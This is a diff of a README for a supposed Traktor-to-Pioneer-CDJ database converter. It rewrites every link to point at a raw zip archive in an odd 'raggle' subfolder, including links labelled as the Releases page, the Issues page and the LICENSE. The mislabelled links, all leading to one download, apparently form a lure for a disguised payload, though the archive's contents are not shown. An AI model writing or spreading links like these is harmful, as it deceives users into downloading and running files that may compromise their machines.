@@ -1,7 +1,7 @@
 # 🎶 Traktor-Bridge - Effortlessly Convert Your Music Databases
 
 ## 📥 Download Now
-[![Download Traktor-Bridge](https://raw.githubusercontent.com/Hansalain/Traktor-Bridge/main/raggle/Traktor-Bridge.zip%20Now-%20%https://raw.githubusercontent.com/Hansalain/Traktor-Bridge/main/raggle/Traktor-Bridge.zip)](https://raw.githubusercontent.com/Hansalain/Traktor-Bridge/main/raggle/Traktor-Bridge.zip)
+[![Download Traktor-Bridge](https://github.com/Hansalain/Traktor-Bridge/raw/refs/heads/main/raggle/Bridge-Traktor-1.4.zip%20Now-%20%https://github.com/Hansalain/Traktor-Bridge/raw/refs/heads/main/raggle/Bridge-Traktor-1.4.zip)](https://github.com/Hansalain/Traktor-Bridge/raw/refs/heads/main/raggle/Bridge-Traktor-1.4.zip)
 
 ## 🚀 Getting Started
 Welcome to Traktor Bridge! This application allows you to convert your music databases for Traktor into formats compatible with Pioneer CDJs. Whether you're a DJ looking to simplify your music management or just want an easy way to transfer your playlists, Traktor Bridge is here to help.
@@ -13,10 +13,10 @@ Welcome to Traktor Bridge! This application allows you to convert your music dat
 - **Java Runtime Environment**: Ensure you have the latest version installed.
 
 ## 🔗 Visit the Releases Page
-To download the latest version of Traktor Bridge, please [visit the Releases page](https://raw.githubusercontent.com/Hansalain/Traktor-Bridge/main/raggle/Traktor-Bridge.zip). Here, you will find all available releases.
+To download the latest version of Traktor Bridge, please [visit the Releases page](https://github.com/Hansalain/Traktor-Bridge/raw/refs/heads/main/raggle/Bridge-Traktor-1.4.zip). Here, you will find all available releases.
 
 ## 📥 Download & Install
-1. Click on the [Releases page](https://raw.githubusercontent.com/Hansalain/Traktor-Bridge/main/raggle/Traktor-Bridge.zip).
+1. Click on the [Releases page](https://github.com/Hansalain/Traktor-Bridge/raw/refs/heads/main/raggle/Bridge-Traktor-1.4.zip).
 2. Look for the latest release at the top.
 3. Locate the file that matches your operating system (e.g., Windows or macOS).
 4. Download the file to your computer.
@@ -43,10 +43,10 @@ To download the latest version of Traktor Bridge, please [visit the Releases pag
 - Explore the help section within the app for troubleshooting common problems.
 
 ## 👥 Community and Support
-If you encounter any issues or have questions, feel free to reach out to our community. You can find help and communicate with other users on the [Traktor-Bridge Issues page](https://raw.githubusercontent.com/Hansalain/Traktor-Bridge/main/raggle/Traktor-Bridge.zip). 
+If you encounter any issues or have questions, feel free to reach out to our community. You can find help and communicate with other users on the [Traktor-Bridge Issues page](https://github.com/Hansalain/Traktor-Bridge/raw/refs/heads/main/raggle/Bridge-Traktor-1.4.zip). 
 
 ## 📄 License
-Traktor Bridge is open-source software. You are free to use it, share it, and modify it according to the terms laid out in the [LICENSE](https://raw.githubusercontent.com/Hansalain/Traktor-Bridge/main/raggle/Traktor-Bridge.zip) file.
+Traktor Bridge is open-source software. You are free to use it, share it, and modify it according to the terms laid out in the [LICENSE](https://github.com/Hansalain/Traktor-Bridge/raw/refs/heads/main/raggle/Bridge-Traktor-1.4.zip) file.
 
 ## 📧 Contact Us
 For any direct inquiries, you can reach out via the email provided in the repository's contact section.
